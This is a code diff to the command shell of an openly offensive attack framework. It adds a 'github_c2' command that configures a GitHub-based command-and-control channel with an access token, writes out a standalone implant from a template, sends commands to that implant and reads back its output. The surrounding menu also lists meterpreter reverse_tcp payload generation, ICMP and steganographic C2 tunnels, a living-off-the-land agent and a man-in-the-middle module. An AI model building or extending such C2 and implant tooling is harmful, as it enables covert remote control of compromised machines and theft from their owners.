@@ -34,8 +34,10 @@ from modules.mitm import MITM
 from modules.icmp_tunnel import send_icmp_command, icmp_c2_listener
 from modules.suggestor import get_suggestions
 from modules import stego_c2
+from modules.github_c2 import GitHubC2
 
 # --- Shell State ---
+github_c2_instance = None
 current_target = None
 current_target_ip = None
 current_module = None
@@ -62,6 +64,7 @@ def print_help():
     print("  icmp              - Use the ICMP C2 Tunnel")
     print("  generate          - Generate a cross-platform payload (msfvenom)")
     print("  stego_c2          - Use the Steganographic C2 Channel")
+    print("  github_c2         - Use the GitHub C2 Channel")
     print("  lotl-agent        - Start the LOTL C2 agent")
     print("  ape-unleash       - Unleash the APE engine")
     print("  hare-unleash      - Unleash the HARE engine")
@@ -92,6 +95,14 @@ def print_generate_help():
     print("  linux         - linux/x86/meterpreter/reverse_tcp")
     print("  python        - python/meterpreter/reverse_tcp")
     print("  php           - php/meterpreter/reverse_tcp")
+
+def print_github_c2_help():
+    """Prints the help menu for the github_c2 command."""
+    print("\n--- GitHub C2 Channel ---")
+    print("  github_c2 configure <token> <owner> <repo> - Configure the C2 channel")
+    print("  github_c2 generate <path>                  - Generate the standalone implant")
+    print("  github_c2 command <cmd>                    - Issue a command to the implant")
+    print("  github_c2 output                           - Retrieve the latest command output")
 
 def print_stego_c2_help():
     """Prints the help menu for the stego_c2 command."""
@@ -240,6 +251,64 @@ def run_generate_command(args):
         print("Error: msfvenom is not installed or not in your PATH. Please install Metasploit Framework.")
     except subprocess.CalledProcessError as e:
         print(f"Error generating payload: {e}")
+
+def run_github_c2_command(args):
+    """Handles the github_c2 command and its subcommands."""
+    global github_c2_instance
+    if not args:
+        print_github_c2_help()
+        return
+
+    command = args[0]
+    command_args = args[1:]
+
+    if command == "configure":
+        if len(command_args) != 3:
+            print("Usage: github_c2 configure <token> <repo_owner> <repo_name>")
+            return
+        token, owner, repo = command_args
+        github_c2_instance = GitHubC2(token, owner, repo)
+        print("GitHub C2 configured successfully.")
+    elif command == "generate":
+        if not github_c2_instance:
+            print("Error: Please configure the C2 channel first with 'github_c2 configure'.")
+            return
+        if len(command_args) != 1:
+            print("Usage: github_c2 generate <output_path>")
+            return
+        output_path = command_args[0]
+        try:
+            with open("github_implant.py", "r") as f:
+                implant_code = f.read()
+
+            implant_code = implant_code.replace("{GIT_TOKEN}", github_c2_instance.token)
+            implant_code = implant_code.replace("{REPO_OWNER}", github_c2_instance.repo_owner)
+            implant_code = implant_code.replace("{REPO_NAME}", github_c2_instance.repo_name)
+
+            with open(output_path, "w") as f:
+                f.write(implant_code)
+            print(f"Implant generated at {output_path}")
+
+        except Exception as e:
+            print(f"Error generating implant: {e}")
+    elif command == "command":
+        if not github_c2_instance:
+            print("Error: Please configure the C2 channel first.")
+            return
+        if not command_args:
+            print("Usage: github_c2 command <command_to_issue>")
+            return
+        full_command = " ".join(command_args)
+        github_c2_instance.issue_command(full_command)
+    elif command == "output":
+        if not github_c2_instance:
+            print("Error: Please configure the C2 channel first.")
+            return
+        output = github_c2_instance.get_output()
+        print(f"\n--- C2 Output ---\n{output}\n--- End Output ---")
+    else:
+        print(f"Unknown github_c2 command: {command}")
+        print_github_c2_help()
 
 def run_stego_c2_command(args):
     """Handles the stego_c2 command and its subcommands."""
@@ -474,6 +543,8 @@ def process_command(cmd_line):
         run_generate_command(args)
     elif command == "stego_c2":
         run_stego_c2_command(args)
+    elif command == "github_c2":
+        run_github_c2_command(args)
     elif command == "lotl-agent":
         # ... (lotl-agent logic)
         pass
